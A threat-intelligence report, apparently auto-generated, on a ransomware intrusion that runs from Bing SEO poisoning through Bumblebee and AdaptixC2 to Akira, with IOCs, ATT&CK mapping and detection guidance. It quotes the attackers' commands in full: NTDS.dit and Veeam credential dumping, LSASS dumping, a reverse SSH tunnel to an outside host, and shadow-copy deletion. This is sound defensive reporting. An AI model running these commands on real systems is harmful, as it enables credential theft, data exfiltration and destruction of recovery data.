# Technical Analysis Report: Bumblebee + AdaptixC2 to Akira Ransomware -- DFIR Report Case TB36726 (2026-06-30)

Prepared by: Actioner
Classification: TLP:CLEAR
Date: 2026-06-30
Version: 1 (DRAFT)

## Executive Summary

A detailed intrusion chain documented by The DFIR Report (case TB36726 / public #PR40373) describes a sophisticated ransomware operation spanning approximately five days, from initial access via Bing search SEO poisoning through Bumblebee malware delivery, AdaptixC2 command-and-control, and ultimately Akira ransomware deployment. The victim searched Bing for "ManageEngine OpManager," was redirected through a malicious domain (opmanager[.]pro) to a fake download site (download-center[.]online), and downloaded a trojanized MSI installer. The MSI delivered a Bumblebee loader via DLL sideloading (consent.exe + msimg32.dll), which established C2 via DGA-generated .org domains. The threat actor then injected an AdaptixC2 agent into a renamed Windows Address Book binary (AdgNsy.exe), performed extensive reconnaissance and credential harvesting (NTDS.dit via wbadmin, Veeam credential dumping, LSASS dumps via lsassy), established persistence via created domain accounts elevated to Enterprise Admins, moved laterally via RDP/SSH tunneling/RustDesk, exfiltrated approximately 77GB of data via FileZilla SFTP, and deployed Akira ransomware across the environment with shadow copy deletion.

## Background: SEO Poisoning Campaign

The threat actor operated a multi-wave SEO poisoning campaign targeting IT administration tools:

- **Wave 1 (May 2025):** Targeted WinMTR, Zenmap, RVTools, Milestone XProtect; used zenmap[.]pro, rvtools[.]pro as front-end domains; DLL sideloading pair icardagt.exe + version.dll; DGA pattern of 13-character .life domains; code-signed by LLC Ellada Comfort, LLC Best Consult, LLC Vector.
- **Wave 2 (July 2025 -- this case):** Targeted ManageEngine OpManager, Advanced IP Scanner, MIB Browser; used opmanager[.]pro, ip-scanner[.]org; DLL sideloading pair consent.exe + msimg32.dll; DGA pattern of 14-character .org domains; code-signed by LLC Resource+, LLC Ugurmana, LLC Leighton, LLC Vector.
- **Potentially Related (October 2025):** Targeted Ivanti VPN credentials; domains netml[.]shop, shopping5[.]shop (shared Hostinger IP 84[.]32[.]84[.]32 with Wave 1). All infrastructure resolved to Hostinger (AS47583).

## Technical Analysis of the Intrusion Chain

### 1. Initial Access (Day 0)

The victim searched Bing for "ManageEngine OpManager" and was redirected through the SEO-poisoned domain opmanager[.]pro to download-center[.]online, where a trojanized MSI installer (ManageEngine-OpManager.msi, SHA256: `186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da`) was downloaded and executed. The MSI was signed with a revoked certificate from "LLC Resource+."

### 2. Execution and DLL Sideloading (Day 0)

The MSI extracted files to `%TEMP%\ApplicationInstallationFolder_11\`:
- `consent.exe` -- legitimate Windows binary used as sideloading host
- `msimg32.dll` (SHA256: `a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331`) -- Bumblebee first-stage loader
- `ManageEngine_OpManager_64bit.exe` -- decoy installer

The Bumblebee loader checked system locale against 27 CIS-region locales and terminated if matched (geofencing). It established C2 via DGA-generated 14-character .org domains.

### 3. C2 Establishment (~5 Hours Post-Execution)

Bumblebee established DGA-based C2 communication to multiple .org domains and IP addresses. The threat actor then injected AdaptixC2 shellcode into AdgNsy.exe (a renamed WAB.exe/Windows Address Book binary) at `C:\Users\<user>\AppData\Local\AdgNsy.exe`. Memory analysis revealed unbacked RWX execution threads and the artifact `hasherezade_pussy.dll`.

### 4. Persistence (Day 1)

- Created domain accounts: `backup_DA` and `backup_EA` with password `P@ssw0rd1234`
- Added `backup_EA` to Enterprise Admins group
- Activated and reset the built-in Administrator account password to `P@ssw0rd!`
- Installed RustDesk remote access tool on multiple servers as a Windows service

### 5. Discovery and Reconnaissance (Days 1-3)

Extensive enumeration via:
- `systeminfo`, `nltest /dclist:`, `whoami /groups`, `nltest /domain_trusts`
- `net group "domain admins" /dom`, `quser /server:<target>`
- SoftPerfect Network Scanner (dropped as `n.exe`)
- PowerShell AD enumeration: `Get-ADComputer`, `Get-ADUser`, `Get-DnsServerZone`, `Export-DnsServerZone`
- `Invoke-ShareFinder -CheckShareAccess -Verbose` (PowerView) output to `C:\programdata\shares.txt`
- SPN enumeration output to `C:\ProgramData\spn.txt`
- Case-obfuscated command shells: `CmD.eXe`, `pOWerShELl.exE`

### 6. Credential Harvesting (Days 2-3)

- **NTDS.dit extraction via wbadmin:** `wbadmin.exe start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:C:\windows\NTDS\ntds.dit,C:\windows\system32\config\SYSTEM,C:\windows\system32\config\SECURITY -quiet`
- **Veeam credential dumping:** `psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password,description,change_time_utc FROM credentials"`
- **LSASS memory dumping via lsassy** using four execution methods (SMB/WMI/Task/MCOM): `rundll32.exe C:\windows\System32\comsvcs.dll, #+000024 <PID> \Windows\Temp\<random>.<ext> full`
- **DPAPI key harvesting:** Accessed credential paths for browser data, password managers, cloud credentials, SSH keys, development credentials

### 7. Lateral Movement (Days 2-5)

- Native Windows RDP (TCP 3389) between compromised hosts
- Reverse SSH tunneling: `ssh user@193[.]242[.]184[.]150 -R *:10400 -p22` for RDP proxying
- RustDesk remote access sessions
- Cloudflare tunneling (via cloudflared installed from `C:\ProgramData\1.ps1`)
- WMI remote process invocation
- DCOM distributed component object model (MMC20.Application)

### 8. Data Exfiltration (Days 3-5)

FileZilla SFTP transfers to 185[.]174[.]100[.]203:22 using username "Stark":
- Session 1: ~39GB
- Session 2: ~41GB
- SYSVOL data: ~2.5GB via reverse SSH tunnel
- Total: approximately 77GB exfiltrated

### 9. Encryption and Impact (~44 Hours Post-Compromise)

- Shadow copy deletion: `powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"`
- Mass service disabling via WMIC: `wmic /node:@C:\temp\hosts1.txt /failfast:on service where "Name Like '%sql%'" call ChangeStartmode Disabled`
- Mass process termination: `wmic /node:@C:\temp1\hosts.txt /failfast:on process where "CommandLine Like '%sql%'" delete`
- Vulnerable driver deployment: `rwdrv.sys` (service: mgdsrv), `hlpdrv.sys` (service: KMHLPSVC)
- Akira ransomware deployed as `locker.exe` (SHA256: `de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d`): `locker.exe -p=G:\ -n=15`
- Second encryption wave on child domain (Day 5): 39 ransomware executions via `win.exe -n=2 netonly`

## Indicators of Compromise (IOCs)

> All network indicators are defanged per convention.

### File Hashes

| Filename | MD5 | SHA1 | SHA256 | Description |
|----------|-----|------|--------|-------------|
| ManageEngine-OpManager.msi | 124a48b78060fa851e1cc077ca35713c | ab82bf27132323861810c0efcac6d5dd01600dd4 | 186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da | Trojanized MSI installer |
| msimg32.dll | ca8646dfc88423bb9fffda811160cebe | febbaf5f08a8e0782ffcce8beef1f2b4e249a52b | a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331 | Bumblebee first-stage loader DLL |
| locker.exe | 8c113b3aa82c81eee7c6b4ed0ba9a90f | d66944e1a57daf04d3e809f22cd01946d593acaf | de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d | Akira ransomware binary |

### C2 Infrastructure

| Indicator | Port | Description |
|-----------|------|-------------|
| 188[.]40[.]187[.]145 | 443 | Bumblebee C2 |
| 109[.]205[.]195[.]211 | 443 | Bumblebee C2 |
| 171[.]22[.]183[.]43 | - | Bumblebee C2 |
| 194[.]127[.]178[.]21 | - | Bumblebee C2 |
| 192[.]121[.]22[.]94 | - | Bumblebee C2 |
| 172[.]96[.]137[.]160 | - | AdaptixC2 C2 |
| 193[.]242[.]184[.]150 | 22 | Reverse SSH tunnel |
| 185[.]174[.]100[.]203 | 22 | FileZilla SFTP exfiltration |

### DGA-Generated Bumblebee C2 Domains

| Domain | Pattern |
|--------|---------|
| ev2sirbd269o5j[.]org | 14-char .org DGA |
| 2rxyt8yrhq0bgj[.]org | 14-char .org DGA |
| d1hmxkpwby0d4s[.]org | 14-char .org DGA |
| yj6jurm5qqkye5[.]org | 14-char .org DGA |
| ewujsfb1dp5ran[.]org | 14-char .org DGA |
| 8doj8uvx604eck[.]org | 14-char .org DGA |
| kwywztxoo2xdot[.]org | 14-char .org DGA |
| ky1d1p1daahe5t[.]org | 14-char .org DGA |
| ovh1kn1tcqw5kp[.]org | 14-char .org DGA |
| 6cimu4mc085em8[.]org | 14-char .org DGA |
| 5ka8rxp6t6eup2[.]org | 14-char .org DGA |
| ks501oz9nm3v05[.]org | 14-char .org DGA |
| v5rjsdqogstopr[.]org | 14-char .org DGA |

### SEO Poisoning Domains

| Domain | Role |
|--------|------|
| opmanager[.]pro | SEO front-end (ManageEngine) |
| ip-scanner[.]org | SEO front-end (IP Scanner) |
| download-center[.]online | Download gateway |
| soft-hub[.]pro | Download gateway |
| zenmap[.]pro | SEO front-end (Zenmap) |
| download-server[.]online | Download gateway (Wave 1) |
| soft-server[.]online | Download gateway (Wave 1) |
| netml[.]shop | Related (October 2025) |
| shopping5[.]shop | Related (October 2025) |

### File Paths

| Path | Description |
|------|-------------|
| %TEMP%\ApplicationInstallationFolder_11\consent.exe | Sideloading host |
| %TEMP%\ApplicationInstallationFolder_11\msimg32.dll | Bumblebee loader DLL |
| %TEMP%\ApplicationInstallationFolder_11\ManageEngine_OpManager_64bit.exe | Decoy installer |
| C:\Users\<user>\AppData\Local\AdgNsy.exe | AdaptixC2 agent (renamed WAB.exe) |
| C:\ProgramData\locker.exe | Akira ransomware |
| C:\ProgramData\FileZilla_3.68.1_win64_sponsored2-setup.exe | FileZilla installer |
| C:\ProgramData\1.ps1 | Cloudflared installation script |
| C:\programdata\shares.txt | Share enumeration output |
| C:\ProgramData\spn.txt | SPN enumeration output |
| C:\ProgramData\AdComputers.csv | AD computer enumeration |
| C:\ProgramData\AdUsers.csv | AD user enumeration |
| %TEMP%\rwdrv.sys | Vulnerable driver (service: mgdsrv) |
| %TEMP%\hlpdrv.sys | Vulnerable driver (service: KMHLPSVC) |
| \Windows\Temp\G7wO.sys | LSASS dump output |
| \Windows\Temp\U8Vfsh.docx | LSASS dump output |
| \Windows\Temp\AsaZQZDJz.avhdx | LSASS dump output |

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1189 | Drive-by Compromise | SEO poisoning via Bing search redirecting to malicious download site |
| T1204.002 | Malicious File | User executed trojanized MSI installer |
| T1574.001 | DLL Search Order Hijacking | consent.exe loading malicious msimg32.dll |
| T1568.002 | Domain Generation Algorithms | Bumblebee DGA-generated 14-char .org C2 domains |
| T1055 | Process Injection | AdaptixC2 shellcode injected into AdgNsy.exe |
| T1136 | Create Account | Created backup_DA and backup_EA domain accounts |
| T1071.001 | Web Protocols | C2 communication over HTTPS |
| T1082 | System Information Discovery | systeminfo, nltest, whoami enumeration |
| T1087.002 | Domain Account Discovery | AD user/computer enumeration via PowerShell |
| T1069.002 | Domain Groups Discovery | Enterprise Admins group enumeration |
| T1482 | Domain Trust Discovery | nltest /domain_trusts |
| T1046 | Network Service Discovery | SoftPerfect Network Scanner |
| T1135 | Network Share Discovery | Invoke-ShareFinder |
| T1003.003 | NTDS | wbadmin extraction of ntds.dit |
| T1003.001 | LSASS Memory | comsvcs.dll MiniDump via lsassy |
| T1555 | Credentials from Password Stores | Veeam PostgreSQL credential dumping |
| T1021.001 | Remote Desktop Protocol | RDP lateral movement |
| T1090 | Proxy | Reverse SSH tunneling for RDP |
| T1219 | Remote Access Tools | RustDesk, Cloudflare tunnel |
| T1021.003 | DCOM | MMC20.Application lateral movement |
| T1047 | WMI | Remote process invocation and service management |
| T1048.001 | Exfiltration Over Encrypted Non-C2 Protocol | FileZilla SFTP to external server |
| T1041 | Exfiltration Over C2 Channel | SYSVOL exfil via SSH tunnel |
| T1490 | Inhibit System Recovery | Shadow copy deletion via PowerShell WMI |
| T1489 | Service Stop | Mass SQL service disabling via WMIC |
| T1486 | Data Encrypted for Impact | Akira ransomware deployment |
| T1543.003 | Windows Service | Vulnerable driver and RustDesk service installation |
| T1059.001 | PowerShell | Enumeration and shadow copy deletion |
| T1059.003 | Windows Command Shell | Case-obfuscated cmd.exe execution |
| T1027.010 | Command Obfuscation | CmD.eXe, pOWerShELl.exE casing |
| T1036 | Masquerading | Renamed WAB.exe as AdgNsy.exe |
| T1569.002 | Service Execution | Service-based execution of drivers |
| T1070.004 | File Deletion | Cleanup of tools post-use |

## Impact Assessment

This intrusion demonstrates a complete ransomware kill chain with high operational maturity:
- **Data exfiltration:** ~77GB over SFTP before encryption (double extortion)
- **Encryption scope:** Two waves across parent and child domains (39 ransomware executions in the second wave)
- **Dwell time:** Approximately 5 days from initial access to full encryption
- **Credential exposure:** NTDS.dit, Veeam credentials, LSASS dumps, DPAPI keys, browser/password-manager data
- **Infrastructure compromise:** Domain controller, backup servers, multiple endpoints across parent and child domains

## Detection & Remediation

### Immediate Detection
- Hunt for consent.exe execution from non-System32 paths (DLL sideloading indicator)
- Monitor for wbadmin.exe backup commands targeting ntds.dit
- Alert on psql.exe queries against VeeamBackup database
- Detect comsvcs.dll MiniDump patterns in rundll32 command lines
- Monitor for net.exe adding users to Enterprise Admins group
- Alert on PowerShell shadow copy deletion commands
- Block known C2 IPs and DGA domains at network perimeter

### Remediation
1. Block all IOC IPs and domains at firewall/proxy
2. Reset all domain account passwords, especially privileged accounts
3. Revoke and reissue all certificates that may have been exposed
4. Remove RustDesk, cloudflared, and any unauthorized remote access tools
5. Audit Enterprise Admins, Domain Admins groups for unauthorized accounts
6. Rebuild compromised systems from known-good images
7. Review Veeam backup credentials and rotate
8. Implement application allowlisting to prevent DLL sideloading

### Long-Term Hardening
- Enforce signed MSI-only installation policies
- Deploy EDR with DLL sideloading detection capabilities
- Implement network segmentation to limit lateral movement
- Enable LSASS protection (RunAsPPL) to prevent credential dumping
- Monitor for unusual outbound SSH/SFTP connections
- Restrict wbadmin.exe and psql.exe execution to authorized administrators

## Detection Rules

### Sigma: Bumblebee DLL Sideloading via consent.exe from Temp Directory
Detects execution of consent.exe from non-standard locations, indicating Bumblebee DLL sideloading.
**Status:** compile pass (splunk exit 0, log_scale exit 0) -- confidence: high
<!-- audit: sigma convert -t splunk exit 0; sigma convert -t log_scale exit 0. sigma check fails due to environment D3FEND data fetch issue (IncompleteRead), not rule syntax. -->
**File:** `rules/sigma/bumblebee-adaptixc2-akira-consent-exe-sideload.yml`

### Sigma: AdaptixC2 Agent Injection via Renamed WAB.exe (AdgNsy.exe)
Detects execution of AdgNsy.exe from AppData\Local -- the most distinctive host artifact of AdaptixC2 agent deployment.
**Status:** compile pass (splunk exit 0, log_scale exit 0) -- confidence: high
<!-- audit: sigma convert -t splunk --without-pipeline exit 0; sigma convert -t log_scale --without-pipeline exit 0. -->
**File:** `rules/sigma/bumblebee-adaptixc2-akira-adaptixc2-agent.yml`

### Sigma: Veeam Backup Credential Extraction via psql
Detects psql.exe querying VeeamBackup credentials table.
**Status:** compile pass (splunk exit 0, log_scale exit 0) -- confidence: medium
**File:** `rules/sigma/bumblebee-adaptixc2-akira-veeam-cred-dump.yml`

### Sigma: Shadow Copy Deletion via PowerShell WMI - Akira Ransomware
Detects shadow copy deletion pattern used by Akira pre-encryption.
**Status:** compile pass (splunk exit 0, log_scale exit 0) -- confidence: medium
**File:** `rules/sigma/bumblebee-adaptixc2-akira-shadow-copy-delete.yml`

### Sigma: Akira Ransomware Locker Execution Pattern
Detects Akira locker.exe with characteristic flags (win.exe removed to reduce FP).
**Status:** compile pass (splunk exit 0, log_scale exit 0) -- confidence: medium
**File:** `rules/sigma/bumblebee-adaptixc2-akira-akira-locker-execution.yml`

### Sigma: Mass Service Disabling via WMIC - Pre-Ransomware Activity
Detects WMIC-based mass service disabling across multiple hosts.
**Status:** compile pass (splunk exit 0, log_scale exit 0) -- confidence: high
**File:** `rules/sigma/bumblebee-adaptixc2-akira-wmi-service-disable.yml`

### YARA: Bumblebee Loader, AdaptixC2 Memory Artifacts, Akira Ransomware
Four rules covering Bumblebee DLL, trojanized MSI, AdaptixC2 memory artifacts, and Akira binary.
**Status:** compile pass (yarac exit 0) -- confidence: high
**File:** `rules/yara/bumblebee_adaptixc2_akira.yar`

### Snort: Bumblebee/AdaptixC2/Akira Network Detection
Seven rules covering C2 beacons, SEO poisoning domains, SSH tunnels, SFTP exfiltration.
**Status:** uncompiled (structural check only) -- confidence: medium
**File:** `rules/snort/bumblebee-adaptixc2-akira.rules`

### Suricata: Bumblebee/AdaptixC2/Akira Network Detection
Seven rules covering C2 beacons, SEO poisoning domains, SSH tunnels, SFTP exfiltration.
**Status:** uncompiled (structural check only) -- confidence: medium
**File:** `rules/suricata/bumblebee-adaptixc2-akira.rules`

## Sources

- [The DFIR Report -- From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira](https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/) -- primary source: complete intrusion timeline, IOCs, MITRE ATT&CK mapping, Suricata rule references
- [Tria.ge -- Bumblebee Wave 1 Sample](https://tria.ge/250530-ttmjhayzhw) -- sandbox analysis of Wave 1 Bumblebee sample
- [Tria.ge -- Bumblebee Wave 2 Sample](https://tria.ge/250812-zw4tfszpy4) -- sandbox analysis of Wave 2 Bumblebee sample (this case)
- [Unit42 Palo Alto Networks -- AdaptixC2 Framework Analysis](https://unit42.paloaltonetworks.com/adaptixc2-framework-analysis/) -- AdaptixC2 framework analysis (URL unverified; root domain confirmed)
- [Cyjax Blog -- Bumblebee SEO Poisoning Campaign](https://www.cyjax.com/resources/blog/bumblebee-seo-poisoning-campaign/) -- May 2025 Bumblebee SEO poisoning campaign identification (URL unverified; root domain confirmed)
- [Zscaler -- Ivanti VPN Campaign Analysis](https://www.zscaler.com/blogs/security-research/ivanti-vpn-credential-theft-campaign/) -- October 2025 related campaign analysis (URL unverified; root domain confirmed)

---
*Report generated by Actioner*
